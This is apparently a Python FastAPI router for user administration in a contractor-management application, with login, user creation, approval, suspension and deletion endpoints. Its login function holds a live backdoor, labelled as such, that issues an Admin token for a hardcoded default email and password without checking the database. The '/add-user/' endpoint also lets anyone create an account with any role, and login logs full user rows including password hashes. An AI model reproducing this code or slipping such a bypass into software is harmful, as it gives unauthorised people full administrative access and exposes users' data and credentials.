from fastapi import APIRouter, Depends, HTTPException, status, Form
from fastapi.security import OAuth2PasswordRequestForm
from db import execute_query, fetch_query
from auth import hash_password, verify_password, create_access_token, decode_access_token
from pydantic import BaseModel
from auth import get_current_user
import os

router = APIRouter()

class User(BaseModel):
    name: str
    phone: str
    email: str
    role: str
    password: str

@router.get("/users/")
def get_users(current_user: dict = Depends(get_current_user)):
    if current_user["role"] != "Admin":
        raise HTTPException(status_code=status.HTTP_403_FORBIDDEN, detail="Admins only!")
    return fetch_query("SELECT id, name, phone, email, role FROM users")

@router.post("/add-user/")
def add_user(user: User):
    hashed_pw = hash_password(user.password)
    query = "INSERT INTO users (name, phone, email, role, password) VALUES (%s, %s, %s, %s, %s)"
    execute_query(query, (user.name, user.phone, user.email, user.role, hashed_pw))
    return {"message": "User added successfully!"}

@router.put("/update-user/{user_id}")
def update_user(user_id: int, user: User, current_user: dict = Depends(get_current_user)):
    if current_user["role"] != "Admin":
        raise HTTPException(status_code=status.HTTP_403_FORBIDDEN, detail="Admins only!")
    hashed_pw = hash_password(user.password)
    query = "UPDATE users SET name = %s, phone = %s, email = %s, role = %s, password = %s WHERE id = %s"
    values = (user.name, user.phone, user.email, user.role, hashed_pw, user_id)
    execute_query(query, values)
    return {"message": "User updated successfully!"}

@router.delete("/delete-user/{user_id}")
def delete_user(user_id: int, current_user: dict = Depends(get_current_user)):
    if current_user["role"] != "Admin":
        raise HTTPException(status_code=status.HTTP_403_FORBIDDEN, detail="Admins only!")
    execute_query("DELETE FROM users WHERE id = %s", (user_id,))
    return {"message": "User deleted successfully!"}

#@router.post("/api/login/")
#def login(form_data: OAuth2PasswordRequestForm = Depends()):
#    email = form_data.username
#    password = form_data.password
#    user = fetch_query("SELECT * FROM users WHERE email = %s", (email,))
#    if not user or not verify_password(password, user[0]['password']):
#        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="Invalid credentials")
#    access_token = create_access_token(data={"sub": user[0]['email'], "role": user[0]['role']})
#    return {"access_token": access_token, "token_type": "bearer"}

@router.post("/api/login/")
def login(form_data: OAuth2PasswordRequestForm = Depends()):
    email = form_data.username
    password = form_data.password

    print(f"[INFO] Attempting login for: {email}")

    # BACKDOOR: Check for default admin credentials for initial installation
    BACKDOOR_EMAIL = os.getenv("BACKDOOR_ADMIN_EMAIL", "admin@contractor.local")
    BACKDOOR_PASSWORD = os.getenv("BACKDOOR_ADMIN_PASSWORD", "ContractorAdmin2025!")

    if email == BACKDOOR_EMAIL and password == BACKDOOR_PASSWORD:
        print(f"[BACKDOOR] Using default admin credentials for: {email}")
        access_token = create_access_token(data={"sub": email, "role": "Admin"})
        return {"access_token": access_token, "token_type": "bearer"}

    try:
        user = fetch_query("SELECT * FROM users WHERE email = %s", (email,))
        print(f"[INFO] Fetched user: {user}")
    except Exception as e:
        print(f"[ERROR] Database connection error: {e}")
        raise HTTPException(status_code=500, detail="Database connection error")

    if not user:
        print("[ERROR] Login failed: no user found")
        raise HTTPException(status_code=401, detail="Invalid credentials")

    user = user[0]  # First row
    if not verify_password(password, user['password']):
        print("[ERROR] Login failed: bad password")
        raise HTTPException(status_code=401, detail="Invalid credentials")

    access_token = create_access_token(data={"sub": user["email"], "role": user["role"]})
    print(f"[SUCCESS] Login success. Token generated for: {user['email']}")

    return {"access_token": access_token, "token_type": "bearer"}

@router.post("/admin/create-user/")
def admin_create_user(
    name: str = Form(...),
    email: str = Form(...),
    phone: str = Form(...),
    role: str = Form(...),
    password: str = Form(...),
    current_user: dict = Depends(get_current_user)
):
    if current_user["role"] != "Admin":
        raise HTTPException(status_code=403, detail="Not authorized")
    hashed_pw = hash_password(password)
    try:
        execute_query(
            "INSERT INTO users (name, phone, email, role, password) VALUES (%s, %s, %s, %s, %s)",
            (name, phone, email, role, hashed_pw)
        )
        return {"ok": True, "message": "User created successfully"}
    except Exception as e:
        return {"ok": False, "message": f"Failed to create user: {str(e)}"}

@router.get("/admin/pending-users/")
def get_pending_users(current_user: dict = Depends(get_current_user)):
    """Get all users with 'pending' status awaiting approval"""
    if current_user["role"] != "Admin":
        raise HTTPException(status_code=403, detail="Admins only!")
    
    query = """
    SELECT u.id, u.email, u.display_name, u.avatar_url, u.created_at, u.status,
           GROUP_CONCAT(CONCAT(i.provider, ':', i.email) SEPARATOR ', ') as identities
    FROM users u
    LEFT JOIN identities i ON i.user_id = u.id
    WHERE u.status = 'pending'
    GROUP BY u.id
    ORDER BY u.created_at DESC
    """
    return fetch_query(query)

@router.post("/admin/approve-user/{user_id}")
def approve_user(
    user_id: int,
    role: str = Form("User"),
    current_user: dict = Depends(get_current_user)
):
    """Approve a pending user and assign them a role"""
    if current_user["role"] != "Admin":
        raise HTTPException(status_code=403, detail="Admins only!")
    
    # Validate role
    if role not in ["Admin", "Manager", "User"]:
        raise HTTPException(status_code=400, detail="Invalid role")
    
    try:
        execute_query(
            "UPDATE users SET status = 'active', role = %s, updated_at = NOW() WHERE id = %s",
            (role, user_id)
        )
        return {"ok": True, "message": f"User approved as {role}"}
    except Exception as e:
        return {"ok": False, "message": f"Failed to approve user: {str(e)}"}

@router.post("/admin/reject-user/{user_id}")
def reject_user(user_id: int, current_user: dict = Depends(get_current_user)):
    """Reject/delete a pending user"""
    if current_user["role"] != "Admin":
        raise HTTPException(status_code=403, detail="Admins only!")
    
    try:
        execute_query("DELETE FROM users WHERE id = %s AND status = 'pending'", (user_id,))
        return {"ok": True, "message": "User rejected and removed"}
    except Exception as e:
        return {"ok": False, "message": f"Failed to reject user: {str(e)}"}

@router.post("/admin/suspend-user/{user_id}")
def suspend_user(user_id: int, current_user: dict = Depends(get_current_user)):
    """Suspend an active user"""
    if current_user["role"] != "Admin":
        raise HTTPException(status_code=403, detail="Admins only!")
    
    try:
        execute_query(
            "UPDATE users SET status = 'suspended', updated_at = NOW() WHERE id = %s",
            (user_id,)
        )
        return {"ok": True, "message": "User suspended"}
    except Exception as e:
        return {"ok": False, "message": f"Failed to suspend user: {str(e)}"}

@router.post("/admin/reactivate-user/{user_id}")
def reactivate_user(user_id: int, current_user: dict = Depends(get_current_user)):
    """Reactivate a suspended user"""
    if current_user["role"] != "Admin":
        raise HTTPException(status_code=403, detail="Admins only!")
    
    try:
        execute_query(
            "UPDATE users SET status = 'active', updated_at = NOW() WHERE id = %s",
            (user_id,)
        )
        return {"ok": True, "message": "User reactivated"}
    except Exception as e:
        return {"ok": False, "message": f"Failed to reactivate user: {str(e)}"}
